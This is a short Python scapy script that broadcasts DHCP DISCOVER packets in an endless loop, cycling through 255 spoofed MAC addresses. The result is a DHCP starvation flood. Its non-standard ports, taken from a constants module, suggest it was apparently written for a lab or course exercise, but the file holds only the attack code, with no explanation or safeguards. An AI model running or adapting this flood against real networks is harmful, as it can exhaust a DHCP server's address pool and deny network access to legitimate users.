import logging
import socket
from time import sleep
from scapy.all import *
from scapy.layers.inet import UDP
import scapy.all as scapy
from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp
import random
from file import Constants

def mac_to_bytes(mac_addr: str) -> bytes:
    """ Converts a MAC address string to bytes.
    """
    return int(mac_addr.replace(":", ""), 16).to_bytes(6, "big")

def discover_generate(mac):
    #src_port=2025, dst_port=2023
    dhcp_discover = (
            Ether(dst="ff:ff:ff:ff:ff:ff") /
            IP(src="0.0.0.0", dst="255.255.255.255") /
            UDP(sport=Constants.src_port, dport=Constants.dest_port) /
            BOOTP(
                chaddr=mac_to_bytes(mac),
                xid=666 #random.randint(1, 2 ** 32 - 1),
            ) /
            DHCP(options=[("message-type", Constants.DISCOVER), "end"])
    )
    #dhcp_discover.show()
    return dhcp_discover

def main():
    logging.basicConfig(format='%(created)f [%(levelname)s] - %(threadName)s - %(message)s')
    logging.getLogger().setLevel(logging.INFO)
    base_str = "40:B0:34:1D:AB:"
    while True:
        for i in range(1, 256):
            # 9
            # A B C D E F-15
            hex_num = hex(i)[2:].upper()
            if i<= 15:
                hex_num = "0"+hex_num
            print(hex_num)
            new_mac = base_str+hex_num
            print(new_mac +"mac")
            dhcp_discover = discover_generate(new_mac) #start_str --> client mac
            sendp(dhcp_discover)

if __name__=="__main__":
    main()